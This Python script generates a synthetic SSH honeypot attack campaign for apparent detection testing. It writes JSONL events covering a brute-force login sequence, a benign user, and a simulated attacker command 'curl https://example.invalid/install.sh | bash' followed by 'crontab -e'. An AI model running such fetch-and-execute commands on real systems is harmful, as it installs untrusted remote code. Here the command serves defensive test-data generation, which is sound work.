import argparse
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUTPUT = Path("data/processed/simulated_campaign.jsonl")

DEFAULT_BASE = datetime(2026, 11, 10, 1, 0, tzinfo=timezone.utc)


def build_campaign(campaign_id="demo", minute_offset=0):
    events = []
    base = DEFAULT_BASE + timedelta(minutes=minute_offset)

    def add_event(minute, ip, session, event_type, **fields):
        timestamp = base + timedelta(minutes=minute)
        events.append({
            "timestamp": timestamp.isoformat().replace("+00:00", "Z"),
            "session_id": f"{session}-{campaign_id}",
            "event_type": event_type,
            "source_ip": ip,
            "protocol": "ssh",
            **fields,
        })


    # Attacker A: brute force followed by successful login
    for minute in range(5):
        add_event(
            minute, "203.0.113.10", "sim-bruteforce",
            "cowrie.login.failed"
        )

    add_event(
        6, "203.0.113.10", "sim-bruteforce",
        "cowrie.login.success"
    )

    # Attacker B: suspicious command execution
    add_event(
        10, "198.51.100.24", "sim-command",
        "cowrie.command.input",
        command="curl https://example.invalid/install.sh | bash"
    )

    add_event(
        11, "198.51.100.24", "sim-command",
        "cowrie.command.input",
        command="crontab -e"
    )

    # Normal user: benign activity
    add_event(
        12, "192.0.2.45", "sim-normal",
        "cowrie.command.input",
        command="whoami"
    )

    return events


def main():
    parser = argparse.ArgumentParser(description="Generate a synthetic CloudTrap SSH attack campaign.")
    parser.add_argument("--campaign-id", default="demo", help="Unique suffix for event/session IDs.")
    parser.add_argument("--minute-offset", type=int, default=0, help="Shift timestamps to create a distinct replay.")
    parser.add_argument("--output", type=Path, default=OUTPUT)
    args = parser.parse_args()
    if not args.campaign_id.replace("-", "").replace("_", "").isalnum():
        parser.error("--campaign-id may contain only letters, numbers, hyphens and underscores")
    events = build_campaign(args.campaign_id, args.minute_offset)
    args.output.parent.mkdir(parents=True, exist_ok=True)
    with args.output.open("w", encoding="utf-8") as file:
        for event in events:
            file.write(json.dumps(event) + "\n")
    print(f"Generated {len(events)} synthetic events (campaign: {args.campaign_id})")
    print(f"Saved to {args.output}")


if __name__ == "__main__":
    main()
